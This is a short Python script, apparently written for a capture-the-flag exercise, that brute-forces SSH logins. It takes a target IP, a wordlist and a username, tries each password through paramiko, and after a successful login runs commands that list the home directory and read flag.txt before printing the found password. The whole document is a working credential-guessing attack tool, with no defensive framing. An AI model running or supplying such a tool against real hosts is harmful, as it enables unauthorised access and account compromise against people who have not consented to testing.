import paramiko
import sys
import os

target_IP = sys.argv[1]
password_wordlist_path = sys.argv[2]
username = sys.argv[3]

wl = open(password_wordlist_path, 'r').readlines()


def ssh_connect(password):
    
    valid = True

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    
    try:
        ssh.connect(target_IP, port = 22, username = username, password = password)

        # stdin, stdou, stderr Are returned as file like objects
        stdin, stdout, stderr = ssh.exec_command('whoami && pwd && cd ~ && ls -al && cat flag.txt')
        print(*stdout.readlines())

    except paramiko.AuthenticationException:
        valid = False

    ssh.close()
    return valid

for word in wl:
    
    current_password = word.strip()
    
    try:
        response = ssh_connect(current_password)
        if response:
                print('Found Password: '+ current_password)
                exit(0)
        else: 
            pass

    except Exception as e:
        print(e)
    
    
